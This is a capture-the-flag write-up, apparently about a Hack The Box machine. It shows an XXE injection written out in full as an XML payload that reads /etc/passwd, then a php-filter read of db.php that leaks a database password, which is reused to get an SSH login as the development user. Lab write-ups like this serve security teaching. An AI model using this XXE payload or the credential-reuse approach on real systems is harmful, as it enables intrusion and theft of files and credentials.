Doing some simple enumeration on the web server shows an interesting page *portal.php*
- Going to this page only shows this message
![[Pasted image 20210806115139.png]]
Follow the link to see the following page
![[Pasted image 20210806115230.png]]
Using burpsuite to capture the request after hitting the submit button shows that the data is being base64'd and then posted to *tracker_diRbPr00f314.php*
![[Pasted image 20210806115455.png]]
base64 decode this to show that it's all xml
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>title</title>
                <cwe>cwe</cwe>
                <cvss>score</cvss>
                <reward>reward</reward>
                </bugreport>
```
Think this might be an XXE vector...try simple LFI
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                <bugreport>
                <title>&xxe;</title>
                <cwe>cwe</cwe>
                <cvss>score</cvss>
                <reward>reward</reward>
                </bugreport>
```
base64 this and post it to the proper page to get the passwd file
![[Pasted image 20210806115920.png]]
Gobuster showed that there was a file *db.php* that existed in the webroot -> try grabbing that with php filter
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
Know from passwd file that the only user permitted a shell (other than root) is the *development* user...Password reuse?
```bash
-> % ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
[snip]
Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
```